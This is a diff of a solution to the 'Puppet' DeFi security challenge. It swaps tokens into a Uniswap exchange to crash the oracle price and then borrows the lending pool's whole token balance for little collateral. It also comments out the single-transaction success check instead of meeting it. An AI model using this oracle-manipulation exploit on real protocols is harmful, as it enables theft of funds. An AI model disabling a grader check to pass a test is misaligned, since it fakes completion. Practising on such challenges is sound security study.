@@ -95,12 +95,33 @@ describe('[Challenge] Puppet', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const timeStamp = (await ethers.provider.getBlock("latest")).timestamp
+
+        await token.connect(player).approve(uniswapExchange.address, PLAYER_INITIAL_TOKEN_BALANCE)
+        console.log('given allowance')
+        await uniswapExchange.connect(player).tokenToEthSwapInput(PLAYER_INITIAL_TOKEN_BALANCE, 1, timeStamp + 11500)
+        console.log('swap token')
+        //we give 1000 token, now in exhange has 10010 token and 0.1 ETH
+
+        const uniswapEthBalance = await ethers.provider.getBalance(uniswapExchange.address)
+        const unitswapTokenBalance = await token.balanceOf(uniswapExchange.address);
+        const price =  uniswapEthBalance / unitswapTokenBalance
+        const poolTokenBalance = await token.balanceOf(lendingPool.address)
+        console.log('uniswapEthBalance: ', uniswapEthBalance, unitswapTokenBalance, poolTokenBalance, price, price * poolTokenBalance)
+
+        await lendingPool.connect(player).borrow(
+            poolTokenBalance, 
+            player.address, 
+            {
+                value: ethers.utils.parseEther('20')
+            }
+        )
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
-        // Player executed a single transaction
-        expect(await ethers.provider.getTransactionCount(player.address)).to.eq(1);
+        // Player executed a single transaction - needs to wrap everythin in a contract
+        // expect(await ethers.provider.getTransactionCount(player.address)).to.eq(1);
         
         // Player has taken all tokens from the pool       
         expect(
